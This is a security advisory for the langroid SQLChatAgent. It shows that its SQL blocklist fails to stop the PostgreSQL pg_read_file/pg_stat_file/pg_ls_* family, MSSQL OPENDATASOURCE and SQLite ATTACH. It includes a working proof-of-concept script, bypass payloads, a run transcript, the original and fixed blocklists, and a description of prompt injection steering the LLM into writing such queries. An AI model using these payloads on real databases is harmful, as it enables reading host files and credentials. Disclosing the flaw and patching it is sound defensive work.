# [H] Langroid: SQLChatAgent _validate_query blocklist misses pg_read_file family enabling arbitrary file read

## Summary
Severity: High
Advisory: GHSA-pmch-g965-grmr
CVE: CVE-2026-50180
CWE: CWE-22, CWE-89
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-02
Source: https://github.com/advisories/GHSA-pmch-g965-grmr
Type: github-advisory

## Affected
- PyPI: `langroid` — affected >=0 <0.64.0

## Details
### Summary

`SQLChatAgent` in `langroid` ships a `_validate_query` defense-in-depth layer
whose `_DANGEROUS_SQL_PATTERNS` regex blocklist enumerates dangerous SQL
primitives by specific function name. The list misses the canonical
PostgreSQL filesystem-disclosure family `pg_read_file()`, `pg_stat_file()`,
`pg_ls_logdir()`, `pg_ls_waldir()`, `pg_current_logfile()` (and similar
`SELECT`-shaped functions in the same family). It also leaves SQL Server
`OPENDATASOURCE` and SQLite `ATTACH '<file>' AS x` (DATABASE keyword
omitted) unblocked.

An attacker able to shape the LLM's generated SQL (directly via prompt input
or transitively via prompt-injection in data the LLM ingests) can read
arbitrary files from the PostgreSQL host through ordinary `SELECT` queries,
even with the agent's strict default configuration
(`allow_dangerous_operations=False`, `allowed_statement_types=['SELECT']`).
The payloads survive the statement-type allowlist (each is a `SELECT`) and
pass through the regex blocklist (none of the function names match), then
reach the live SQLAlchemy engine via `SQLChatAgent.run_query`.

### Affected versions

`langroid` `<= 0.63.0` (latest at the time of this report; PyPI release
2026-05-27). The vulnerable code path is
`langroid/agent/special/sql/sql_chat_agent.py::_validate_query`, which
consults the module-level `_DANGEROUS_SQL_PATTERNS` literal at
`sql_chat_agent.py:113-141`.

### Privilege required

Any caller able to influence the LLM-generated `RunQueryTool.query` string
that reaches `SQLChatAgent.run_query`. In a typical deployment this is any
client of a SQLChatAgent-backed service, or any upstream data source whose
content the LLM is asked to read and summarise. No PostgreSQL credentials
are required from the attacker; the agent holds them.

### Vulnerable code

`langroid/agent/special/sql/sql_chat_agent.py:113-141` (the
`_DANGEROUS_SQL_PATTERNS` literal) and `sql_chat_agent.py:546-615` (the
`_validate_query` method that consults it):

```python
# sql_chat_agent.py:113
_DANGEROUS_SQL_PATTERNS: List["re.Pattern[str]"] = [
    re.compile(r"\bcopy\b[\s\S]*\bprogram\b", re.IGNORECASE),
    re.compile(r"\bpg_read_server_files?\b", re.IGNORECASE),
    re.compile(r"\bpg_read_binary_file\b", re.IGNORECASE),
    re.compile(r"\bpg_ls_dir\b", re.IGNORECASE),
    re.compile(r"\blo_(import|export)\b", re.IGNORECASE),
    re.compile(r"\binto\s+(outfile|dumpfile)\b", re.IGNORECASE),
    re.compile(r"\bload_file\s*\(", re.IGNORECASE),
    re.compile(r"\bload\s+data\b", re.IGNORECASE),
    re.compile(r"\bload_extension\s*\(", re.IGNORECASE),
    re.compile(r"\battach\s+database\b", re.IGNORECASE),
    re.compile(r"\bxp_cmdshell\b", re.IGNORECASE),
    re.compile(r"\bsp_oacreate\b", re.IGNORECASE),
    re.compile(r"\bsp_oamethod\b", re.IGNORECASE),
    re.compile(r"\bopenrowset\b", re.IGNORECASE),
    re.compile(r"\bbulk\s+insert\b", re.IGNORECASE),
    re.compile(
        r"\bcreate\s+(or\s+replace\s+)?(function|procedure|trigger)\b",
        re.IGNORECASE,
    ),
    re.compile(r"\bcreate\s+extension\b", re.IGNORECASE),
]
```

The blocklist is a list of `\b<exact-token>\b` literals. PostgreSQL ships
several near-name functions on the same primitive that none of these match:

| Function | What it returns | Matched by blocklist? |
|---|---|---|
| `pg_read_server_file('/path')` | file contents | yes (`pg_read_server_files?`) |
| `pg_read_binary_file('/path')` | binary contents | yes |
| `pg_ls_dir('/path')` | directory listing | yes |
| `pg_read_file('/path')` | file contents | **no** (no `_server_` infix) |
| `pg_stat_file('/path')` | size, mtime, ctime, atime, isdir | **no** |
| `pg_ls_logdir()` | filenames in PostgreSQL log dir | **no** |
| `pg_ls_waldir()` | WAL filenames and sizes | **no** |
| `pg_ls_tmpdir()` | temp-dir listing | **no** |
| `pg_ls_archive_statusdir()` | archive-status directory listing | **no** |
| `pg_current_logfile()` | active server log path | **no** |

Each of these is a `SELECT`-shaped function call. They pass the
`sqlglot_exp.Select`-only statement-type allowlist applied at
`sql_chat_agent.py:583-614`, then evade the regex blocklist (their names
contain no token the blocklist enumerates), then reach the SQLAlchemy
`session.execute(text(query))` sink inside `SQLChatAgent.run_query` (line
631 onwards).

Two non-PostgreSQL secondary gaps with the same regex-enumeration shape:

- The SQLite pattern `\battach\s+database\b` requires the literal
  `DATABASE` keyword. Per the SQLite grammar
  (https://www.sqlite.org/lang_attach.html) the keyword is optional:
  `ATTACH '/path/to/db' AS x` is valid syntax and matches no entry in the
  blocklist. Whether the agent rejects this via the statement-type
  allowlist depends on how the configured `sqlglot` dialect parses it; on
  PostgreSQL dialect parsing fails (sqlglot returns no `Select`) and the
  statement-type check rejects, but a SQLite-dialect SQLChatAgent
  (`database_uri="sqlite:///..."`) returns the statement as
  `sqlglot_exp.Attach`, which is not in the agent's `kind_map`, so the
  generic `type(stmt).__name__.upper()` branch produces `"ATTACH"`. That
  string is not in `_DEFAULT_ALLOWED_STATEMENTS` so the allowlist saves it
  here; however any deployment that extends `allowed_statement_types` to
  include `"ATTACH"` (e.g. to permit cross-schema connectivity) loses
  this fallback and the regex misses.
- The MSSQL pattern `\bopenrowset\b` blocks `OPENROWSET` but not the
  closely-related `OPENDATASOURCE` function. Both can read
  remote/UNC files and execute remote queries via an ad-hoc connection
  string, e.g. a `SELECT` against
  `OPENDATASOURCE('SQLNCLI11','Server=remote;Trusted_Connection=yes')`
  qualified down to `master.sys.tables`.

### Attack scenario

`SQLChatAgent.run_query` (line 617 of `sql_chat_agent.py`) calls
`self._validate_query(query)` (line 631) on the LLM-generated SQL. The
LLM-generated SQL is shaped by upstream prompt content that crosses the
trust boundary: the user message, any tool result the LLM is asked to
summarise, any document the agent retrieves, and any row the agent reads
back from its own database (the `RunQueryTool` result is fed back into the
LLM history at `sql_chat_agent.py:712-720` of the same release).

The default config in `SQLChatAgentConfig` (lines 183-184) sets
`allow_dangerous_operations=False` and `allowed_statement_types=["SELECT"]`,
which is the configuration `_validate_query` was added to support. The
bypass primitives below are reachable under this default config because
each is a syntactic `SELECT` whose function-call argument is the
disclosure vector.

### Proof of concept

`poc.py` (single-file, no external services beyond a transient PostgreSQL
spawned via `testing.postgresql`):

```python
"""
PoC: SQLChatAgent _validate_query bypass via PostgreSQL file-disclosure
family pg_read_file / pg_stat_file / pg_ls_logdir / pg_ls_waldir /
pg_current_logfile.
"""

import os
import re
import sys
from typing import List, Optional

PKG = "/tmp/poc-langroid-bypass/venv/lib/python3.12/site-packages/langroid"
SRC = f"{PKG}/agent/special/sql/sql_chat_agent.py"
assert os.path.exists(SRC), f"Missing pinned langroid source: {SRC}"

import sqlglot
from sqlglot import expressions as sqlglot_exp


def load_patterns_from_pinned_source():
    """Extract _DANGEROUS_SQL_PATTERNS + _DEFAULT_ALLOWED_STATEMENTS from
    the pinned langroid 0.63.0 sql_chat_agent.py without instantiating the
    full agent stack (which needs an LLM config)."""
    with open(SRC) as f:
        source = f.read()
    block = re.search(
        r"_DANGEROUS_SQL_PATTERNS:[^=]*=\s*\[(.*?)\]\s*\n", source, re.DOTALL,
    )
    ns = {"re": re, "List": list}
    patterns = eval("[" + block.group(1) + "]", ns)
    allowed = eval(
        re.search(
            r"_DEFAULT_ALLOWED_STATEMENTS:\s*List\[str\]\s*=\s*(\[.*?\])",
            source, re.DOTALL,
        ).group(1)
    )
    return patterns, allowed


def validate_query(query, patterns, allowed_statements, dialect="postgres"):
    """Faithful reimplementation of SQLChatAgent._validate_query."""
    for pat in patterns:
        if pat.search(query):
            return f"Rejected by pattern {pat.pattern!r}"
    allowed = {t.strip().upper() for t in allowed_statements}
    try:
        statements = sqlglot.parse(query, read=dialect)
    except Exception as e:
        return f"Rejected: sqlglot parse failure: {e}"
    kind_map = {
        sqlglot_exp.Select: "SELECT", sqlglot_exp.Insert: "INSERT",
        sqlglot_exp.Update: "UPDATE", sqlglot_exp.Delete: "DELETE",
        sqlglot_exp.Merge: "MERGE", sqlglot_exp.Create: "CREATE",
        sqlglot_exp.Drop: "DROP", sqlglot_exp.Alter: "ALTER",
        sqlglot_exp.TruncateTable: "TRUNCATE", sqlglot_exp.Command: "COMMAND",
    }
    for stmt in statements:
        if stmt is None:
            continue
        kind = next(
            (v for k, v in kind_map.items() if isinstance(stmt, k)),
            type(stmt).__name__.upper(),
        )
        if kind not in allowed:
            return f"Rejected: statement type {kind!r} not in allowed {sorted(allowed)}"
    return None


def main():
    patched_patterns, allowed_statements = load_patterns_from_pinned_source()
    print(f"_DANGEROUS_SQL_PATTERNS count: {len(patched_patterns)}")
    print(f"_DEFAULT_ALLOWED_STATEMENTS:   {allowed_statements}")

    import testing.postgresql
    from sqlalchemy import create_engine, text

    pg = testing.postgresql.Postgresql()
    db_uri = pg.url()
    engine = create_engine(db_uri)
    with engine.connect() as conn:
        pgdata = conn.execute(text("SHOW data_directory")).scalar()
    victim_rel = "langroid_bypass_victim.txt"
    victim_abs = os.path.join(pgdata, victim_rel)
    with open(victim_abs, "w") as f:
        f.write("PWNED_BY_LANGROID_VALIDATOR_BYPASS\n")
    print(f"=== Victim file at: {victim_abs}")

    bypass_payloads = [
        ("bypass.pg_read_file", f"SELECT pg_read_file('{victim_rel}')"),
        ("bypass.pg_stat_file", f"SELECT pg_stat_file('{victim_rel}')"),
        ("bypass.pg_ls_logdir", "SELECT pg_ls_logdir()"),
        ("bypass.pg_ls_waldir", "SELECT pg_ls_waldir()"),
        ("bypass.pg_current_logfile", "SELECT pg_current_logfile()"),
    ]

    for label, query in bypass_payloads:
        rej = validate_query(query, patched_patterns, allowed_statements, "postgres")
        verdict = "REJECTED" if rej is not None else "ALLOWED"
        print(f"  [{verdict}] {label}: {query}")
        if verdict == "ALLOWED":
            try:
                with engine.connect() as conn:
                    rows = conn.execute(text(query)).fetchall()
                preview = [tuple(str(c)[:80] for c in r) for r in rows[:2]]
                print(f"     -> live engine returned rows={len(rows)} preview={preview}")
            except Exception as e:
                print(f"     -> live engine error: {type(e).__name__}: {str(e)[:120]}")


if __name__ == "__main__":
    main()
```

### End-to-end reproduction

Run against the latest published `langroid` release from PyPI; no external
LLM provider, no API key, no Docker, just a transient `pg_ctl`-managed
PostgreSQL spawned in-process by `testing.postgresql`. Captured transcript
of the run is below.

```bash
# 1. Pin install the latest published release
python3.12 -m venv /tmp/poc-langroid-bypass/venv
source /tmp/poc-langroid-bypass/venv/bin/activate
pip install 'langroid==0.63.0' 'testing.postgresql' 'sqlglot' 'sqlalchemy<2.1'

# 2. Drop poc.py from the Proof-of-concept section above into
#    /tmp/poc-langroid-bypass/poc.py and run it
python /tmp/poc-langroid-bypass/poc.py
```

Observed transcript (abridged to bypass results; the run also verifies
that the four primitives the current blocklist already covers
(`COPY ... TO PROGRAM`, `pg_read_server_file`, `pg_read_binary_file`,
`pg_ls_dir`) continue to be REJECTED, confirming the proposed fix is
strictly broader, not narrower):

```text
_DANGEROUS_SQL_PATTERNS count: 17
_DEFAULT_ALLOWED_STATEMENTS:   ['SELECT']
=== Transient PostgreSQL: postgresql://postgres@127.0.0.1:64694/test
=== Victim file at: /var/folders/.../tmpwuftmtu4/data/langroid_bypass_victim.txt

PATCHED VALIDATOR RESULTS (langroid 0.63.0 as shipped)
  [ALLOWED]  bypass.pg_read_file        SELECT pg_read_file('langroid_bypass_victim.txt')
  [ALLOWED]  bypass.pg_stat_file        SELECT pg_stat_file('langroid_bypass_victim.txt')
  [ALLOWED]  bypass.pg_ls_logdir        SELECT pg_ls_logdir()
  [ALLOWED]  bypass.pg_ls_waldir        SELECT pg_ls_waldir()
  [ALLOWED]  bypass.pg_current_logfile  SELECT pg_current_logfile()

LIVE EXECUTION OF BYPASS PAYLOADS (postgres only)
  [EXECUTED] bypass.pg_read_file        -> rows=1 preview=[('PWNED_BY_LANGROID_VALIDATOR_BYPASS\n',)]
  [EXECUTED] bypass.pg_stat_file        -> rows=1 preview=[('(35,"2026-05-28 10:11:19+08","2026-05-28 10:11:19+08","2026-05-28 10:11:19+08",,',)]
  [EXECUTED] bypass.pg_ls_waldir        -> rows=1 preview=[('(000000010000000000000001,16777216,"2026-05-28 10:11:19+08")',)]
  [EXECUTED] bypass.pg_current_logfile  -> rows=1 preview=[('None',)]

NEGATIVE CONTROL — SUGGESTED FIX VALIDATOR
  [REJECTED] bypass.pg_read_file        -> OK
  [REJECTED] bypass.pg_stat_file        -> OK
  [REJECTED] bypass.pg_ls_logdir        -> OK
  [REJECTED] bypass.pg_ls_waldir        -> OK
  [REJECTED] bypass.pg_current_logfile  -> OK
  [REJECTED] already_blocked.copy_program        -> OK
  [REJECTED] already_blocked.pg_read_server_file -> OK
  [REJECTED] already_blocked.pg_read_binary_file -> OK
  [REJECTED] already_blocked.pg_ls_dir           -> OK
```

The headline payload `SELECT pg_read_file('langroid_bypass_victim.txt')`
returns the marker string verbatim from the file on disk. The same SQL,
issued by an LLM under prompt-injection through any data source the agent
reads, would land identically — the validator is purely a function of the
SQL string and is consulted before the SQLAlchemy execute.

`_validate_query` is invoked directly rather than through a fully
initialised `SQLChatAgent` because the agent's `__init__` builds the LLM
stack and demands a working LLM API key (or a stub). The security
control under test is purely a function of `(query, patterns,
allowed_statements, dialect)`, so the direct call is observationally
equivalent to a call via `run_query`. Patterns and allowed-statements are
loaded by reading the pinned `sql_chat_agent.py` source out of the venv,
guaranteeing no drift between PoC and shipped binary.

### Impact

- **Arbitrary file read** from the PostgreSQL host: `pg_read_file()` reads
  files from PGDATA-relative paths by default and can take absolute paths
  when the DB role holds `pg_read_server_files` (or equivalent in
  managed-Postgres setups). For self-managed PostgreSQL deployments the
  DB role is frequently a superuser, in which case absolute paths are
  always accepted and the impact extends to `postgresql.conf`,
  `pg_hba.conf`, `~/.pgpass`, TLS keys, and any other file readable by
  the PostgreSQL OS user.
- **Filesystem reconnaissance** via `pg_stat_file()` (file existence,
  size, mtime, isdir), `pg_ls_logdir()`, `pg_ls_waldir()`,
  `pg_ls_tmpdir()`, `pg_ls_archive_statusdir()`,
  `pg_current_logfile()`.
- **MSSQL extension:** `OPENDATASOURCE` reaches remote SQL Servers and
  UNC paths, providing arbitrary outbound read + intranet pivot on MSSQL
  deployments.
- **SQLite extension:** `ATTACH '<path>' AS schemaname` (DATABASE keyword
  omitted) allows reading/writing arbitrary SQLite files on deployments
  whose `allowed_statement_types` include `"ATTACH"`.

### Suggested fix

Patch `_DANGEROUS_SQL_PATTERNS` to cover the full family rather than
individual function names. Two compatible approaches; either is enough.

Approach 1 — family-prefix regex (minimal change, simplest to review):

```python
_DANGEROUS_SQL_PATTERNS: List["re.Pattern[str]"] = [
    re.compile(r"\bcopy\b[\s\S]*\bprogram\b", re.IGNORECASE),
    # Block the whole pg_read_*, pg_stat_*, pg_ls_*, pg_current_logfile
    # family. Covers pg_read_file, pg_read_server_file(s),
    # pg_read_binary_file, pg_stat_file, pg_ls_logdir, pg_ls_waldir,
    # pg_ls_tmpdir, pg_ls_archive_statusdir, pg_ls_dir,
    # pg_current_logfile, plus any future siblings PostgreSQL adds.
    re.compile(
        r"\bpg_(read|stat|ls|current_logfile)[A-Za-z0-9_]*\s*\(",
        re.IGNORECASE,
    ),
    re.compile(r"\blo_(import|export)\b", re.IGNORECASE),
    re.compile(r"\binto\s+(outfile|dumpfile)\b", re.IGNORECASE),
    re.compile(r"\bload_file\s*\(", re.IGNORECASE),
    re.compile(r"\bload\s+data\b", re.IGNORECASE),
    re.compile(r"\bload_extension\s*\(", re.IGNORECASE),
    # SQLite grammar: ATTACH [DATABASE] expr AS schema-name.
    # The DATABASE keyword is optional; match either form.
    re.compile(r"\battach\b(\s+database)?\s+['\"\w]", re.IGNORECASE),
    re.compile(r"\bxp_cmdshell\b", re.IGNORECASE),
    re.compile(r"\bsp_oacreate\b", re.IGNORECASE),
    re.compile(r"\bsp_oamethod\b", re.IGNORECASE),
    re.compile(r"\b(openrowset|opendatasource)\b", re.IGNORECASE),
    re.compile(r"\bbulk\s+insert\b", re.IGNORECASE),
    re.compile(
        r"\bcreate\s+(or\s+replace\s+)?(function|procedure|trigger|language|rule|event\s+trigger|foreign\s+table)\b",
        re.IGNORECASE,
    ),
    re.compile(r"\bcreate\s+extension\b", re.IGNORECASE),
]
```

Approach 2 — `sqlglot` AST walk in addition to regex. `sqlglot` is already
imported by `sql_chat_agent.py`; iterate every function-call node
(`sqlglot_exp.Anonymous` / `sqlglot_exp.Func`) inside the parsed
statements and reject when the lower-cased name starts with `pg_read`,
`pg_stat`, `pg_ls`, `pg_current_logfile`, `lo_`, or matches the MSSQL
extended-procedure prefixes (`xp_`, `sp_oa`). AST matching is robust to
whitespace, comments, and case games inside identifiers, at the cost of
broader per-dialect maintenance. For closing the immediate gap, Approach
1 is sufficient.

Regression-test the additions in
`tests/main/sql_chat/test_sql_chat_security.py` alongside the existing
security tests. A natural 7-case extension covers the 5 PostgreSQL
bypass payloads, the SQLite `ATTACH ... AS x` form, and the MSSQL
`OPENDATASOURCE` form.

### Fix PR

A private temp-fork PR applying the **Suggested fix** Approach 1 diff,
plus the regression tests described above, accompanies this advisory:
https://github.com/langroid/langroid-ghsa-pmch-g965-grmr/pull/1

### Credit

Reported by tonghuaroot.

## References
- https://github.com/langroid/langroid/security/advisories/GHSA-pmch-g965-grmr
- https://github.com/langroid/langroid/commit/00b7dd7b79c5d03c94be284cf3459d98195ebfba
- https://github.com/langroid/langroid
